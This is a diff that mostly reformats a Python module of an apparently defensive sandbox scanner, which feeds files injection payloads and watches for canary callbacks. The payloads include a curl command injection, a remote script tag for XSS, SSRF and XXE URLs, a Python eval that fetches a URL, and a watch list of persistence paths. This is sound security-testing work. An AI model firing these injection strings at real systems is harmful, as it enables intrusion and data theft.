@@ -41,7 +41,7 @@ import asyncio
 import logging
 import time
 import uuid
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import Any
 
 from dast.sandbox.client import SandboxClient, SandboxPlan, SandboxTrace
@@ -117,7 +117,7 @@ _TARGET_INVOKE = (
     '*.class) java -cp /workspace "${FILE_NAME%.class}";;'
     '*.jar) java -jar "/workspace/$FILE_NAME";;'
     '*) python3 "/workspace/$FILE_NAME";;'
-    'esac'
+    "esac"
 )
 
 
@@ -139,11 +139,12 @@ def _target_invoke_for(filename: str) -> str:
     if fn.endswith(".class"):
         # Strip .class suffix to get the class name; java needs the
         # bare classname + classpath, not the file path.
-        class_name = filename[:-len(".class")]
+        class_name = filename[: -len(".class")]
         return f'java -cp /workspace "{class_name}"'
     if fn.endswith(".jar"):
         return f'java -jar "/workspace/{filename}"'
     return f'python3 "/workspace/{filename}"'  # default fallback
+
 
 DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
     DiscoveryPayload(
@@ -151,9 +152,7 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         cwe_name="OS Command Injection",
         severity="critical",
         payload_input=f"; curl -s http://{_DISCOVERY_DOMAIN}/cwe78 #",
-        commands=(
-            f"{_TARGET_INVOKE} '; curl -s http://{_DISCOVERY_DOMAIN}/cwe78 #' 2>&1 || true",
-        ),
+        commands=(f"{_TARGET_INVOKE} '; curl -s http://{_DISCOVERY_DOMAIN}/cwe78 #' 2>&1 || true",),
         # Oracle: did the file actually trigger the network call? The
         # sandbox capture server (DNS hijack -> 127.0.0.1:80) emits an
         # event when ANY hostname is queried. We match on the canary
@@ -204,14 +203,8 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         # an XSS payload that, if reflected unsanitized to a webpage,
         # would call the canary domain. For non-web files this won't
         # fire — that's correct behavior.
-        payload_input=(
-            f"<script src=\"http://{_DISCOVERY_DOMAIN}/cwe79.js\"></script>"
-        ),
-        commands=(
-            f"{_TARGET_INVOKE} "
-            f"'<script src=\"http://{_DISCOVERY_DOMAIN}/cwe79.js\"></script>' "
-            "2>&1 || true",
-        ),
+        payload_input=(f'<script src="http://{_DISCOVERY_DOMAIN}/cwe79.js"></script>'),
+        commands=(f"{_TARGET_INVOKE} '<script src=\"http://{_DISCOVERY_DOMAIN}/cwe79.js\"></script>' 2>&1 || true",),
         oracle_keywords=(_DISCOVERY_DOMAIN,),
     ),
     DiscoveryPayload(
@@ -240,9 +233,7 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         # user input, this URL gets fetched. Internal hostnames test
         # the file's access to attacker-controlled infrastructure.
         payload_input=f"http://{_DISCOVERY_DOMAIN}/cwe918-ssrf",
-        commands=(
-            f"{_TARGET_INVOKE} 'http://{_DISCOVERY_DOMAIN}/cwe918-ssrf' 2>&1 || true",
-        ),
+        commands=(f"{_TARGET_INVOKE} 'http://{_DISCOVERY_DOMAIN}/cwe918-ssrf' 2>&1 || true",),
         oracle_keywords=(_DISCOVERY_DOMAIN,),
     ),
     DiscoveryPayload(
@@ -255,11 +246,11 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         payload_input=(
             f'<?xml version="1.0"?>'
             f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{_DISCOVERY_DOMAIN}/cwe611-xxe">]>'
-            f'<foo>&xxe;</foo>'
+            f"<foo>&xxe;</foo>"
         ),
         commands=(
-            f"{_TARGET_INVOKE} '<?xml version=\"1.0\"?>"
-            f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{_DISCOVERY_DOMAIN}/cwe611-xxe\">]>"
+            f'{_TARGET_INVOKE} \'<?xml version="1.0"?>'
+            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{_DISCOVERY_DOMAIN}/cwe611-xxe">]>'
             f"<foo>&xxe;</foo>' 2>&1 || true",
         ),
         oracle_keywords=(_DISCOVERY_DOMAIN,),
@@ -271,10 +262,7 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         # Python-style code injection via input that contains eval-able
         # expressions. If the file does ``eval(input)`` or ``exec(input)``
         # or imports based on input, this triggers a network call.
-        payload_input=(
-            f"__import__('urllib.request').request.urlopen("
-            f"'http://{_DISCOVERY_DOMAIN}/cwe94-eval').read()"
-        ),
+        payload_input=(f"__import__('urllib.request').request.urlopen('http://{_DISCOVERY_DOMAIN}/cwe94-eval').read()"),
         commands=(
             f"{_TARGET_INVOKE} "
             f"\"__import__('urllib.request').request.urlopen("
@@ -324,8 +312,14 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         # via a path-list oracle (added in v0.5).
         oracle_event_kinds=("file_writes_observed",),
         oracle_observed_paths=(
-            "/etc/", "/.ssh/", "/.bashrc", "/.bash_profile",
-            "/.profile", "/crontab", "/usr/local/", "/sitecustomize.py",
+            "/etc/",
+            "/.ssh/",
+            "/.bashrc",
+            "/.bash_profile",
+            "/.profile",
+            "/crontab",
+            "/usr/local/",
+            "/sitecustomize.py",
             "/.pth",
         ),
     ),
@@ -373,26 +367,30 @@ class DiscoveredFinding:
 # text we passed in). Oracle matching only checks observation events —
 # matching on meta events would re-introduce the stdout-echo false
 # positive class (our own command text appearing in process_spawn).
-_OBSERVATION_EVENT_KINDS = frozenset({
-    "network_call_captured",
-    "file_writes_observed",
-    "file_reads_observed",
-    "process_exit",       # exit code carries info about what ran
-    "syscall_observed",   # if instrumented (future)
-    "expected_evidence_match",
-})
+_OBSERVATION_EVENT_KINDS = frozenset(
+    {
+        "network_call_captured",
+        "file_writes_observed",
+        "file_reads_observed",
+        "process_exit",  # exit code carries info about what ran
+        "syscall_observed",  # if instrumented (future)
+        "expected_evidence_match",
+    }
+)
 
 # Meta events — explicitly EXCLUDED from oracle matching. The file
 # may have caused effects but the event payload echoes our planned
 # input rather than file behavior.
-_META_EVENT_KINDS = frozenset({
-    "execution_start",
-    "execution_complete",
-    "process_spawn",      # carries our command text — false-positive trap!
-    "process_timeout",
-    "env_error",
-    "env_setup",
-})
+_META_EVENT_KINDS = frozenset(
+    {
+        "execution_start",
+        "execution_complete",
+        "process_spawn",  # carries our command text — false-positive trap!
+        "process_timeout",
+        "env_error",
+        "env_setup",
+    }
+)
 
 
 def _events_text(trace: SandboxTrace) -> str:
@@ -479,10 +477,7 @@ def _oracle_match(
             # Path-restriction filter for persistence-style oracles.
             if oracle_observed_paths and ev.kind == "file_writes_observed":
                 payload_text = str(ev.payload or "").lower()
-                hit_paths = [
-                    p for p in oracle_observed_paths
-                    if p.lower() in payload_text
-                ]
+                hit_paths = [p for p in oracle_observed_paths if p.lower() in payload_text]
                 if not hit_paths:
                     continue  # event kind matched but path doesn't — skip
                 matched.extend(f"path:{p}" for p in hit_paths)
@@ -545,7 +540,7 @@ async def run_discovery(
         t0 = time.time()
         try:
             trace = await asyncio.wait_for(sandbox.submit(plan), timeout=timeout_sec)
-        except asyncio.TimeoutError:
+        except TimeoutError:
             log.warning("discovery plan %s timed out", plan.plan_id)
             traces_summary.append(
                 {
